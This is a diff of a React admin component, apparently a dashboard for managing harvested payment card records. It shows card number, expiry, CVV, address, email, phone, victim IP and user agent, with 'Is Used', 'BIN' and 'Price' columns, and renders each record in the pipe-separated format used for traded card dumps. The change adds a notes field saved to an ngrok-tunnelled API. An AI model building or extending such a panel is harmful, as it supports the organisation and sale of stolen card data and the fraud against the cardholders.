@@ -1,20 +1,34 @@
 import React, { useState } from 'react';
-import { Card, Table, Space, Pagination, Modal, Tag, Row, Col } from 'antd';
+import { Card, Table, Space, Pagination, Modal, Tag, Row, Col, Input } from 'antd';
+import axios from 'axios';
 
 const { Column } = Table;
 
-const BottomBox = ({ dataSource, loading }) => {
+const BottomBox = ({ dataSource, fetchData, loading }) => {
   const [isModalVisible, setIsModalVisible] = useState(false);
   const [selectedRecord, setSelectedRecord] = useState(null);
+  const [note, setNote] = useState('');
 
   const showModal = (record) => {
     setSelectedRecord(record);
+    setNote(record.Note || ''); // Set giá trị ghi chú ban đầu
     setIsModalVisible(true);
   };
 
-  const handleOk = () => {
-    setIsModalVisible(false);
-    setSelectedRecord(null);
+  const handleOk = async () => {
+    // Gọi API để cập nhật ghi chú
+    try {
+      const apiUrl = 'https://bc9e-51-8-81-143.ngrok-free.app/information/updateNote'; // Chỉ định URL API đầy đủ
+      await axios.put(apiUrl, { note, id: selectedRecord.key });
+
+      // Gọi lại fetchData để lấy dữ liệu mới nhất sau khi cập nhật thành công
+      await fetchData();
+
+      setIsModalVisible(false);
+      setSelectedRecord(null);
+    } catch (error) {
+      console.error('Failed to update note:', error);
+    }
   };
 
   const handleCancel = () => {
@@ -45,6 +59,8 @@ const BottomBox = ({ dataSource, loading }) => {
         />
         <Column title="Log Date" dataIndex="createDate" key="createDate"></Column>
         <Column title="Total Bin" dataIndex="TotalBin" key="TotalBin" />
+        <Column title="Note" dataIndex="Note" key="Note" />
+
         <Column
           title=""
           dataIndex="Price"
@@ -81,6 +97,12 @@ const BottomBox = ({ dataSource, loading }) => {
               <p><strong>IP:</strong> {selectedRecord.ip}</p>
               <p><strong>Is Used:</strong> {selectedRecord.isUsed ? 'Yes' : 'No'}</p>
               <p><strong>User Agent:</strong> {selectedRecord.userAgent}</p>
+              <p><strong>Note:</strong></p>
+              <Input.TextArea
+                value={note}
+                onChange={(e) => setNote(e.target.value)}
+                rows={4}
+              />
             </Col>
             <Col span={12} style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px' }}>
               <p><strong>{selectedRecord.ccnum}|{selectedRecord.month}/{selectedRecord.year}|{selectedRecord.cvv}|{selectedRecord.address}|{selectedRecord.city}|{selectedRecord.state}|{selectedRecord.email}|{selectedRecord.phone}|{selectedRecord.ip}|{selectedRecord.userAgent}</strong></p>
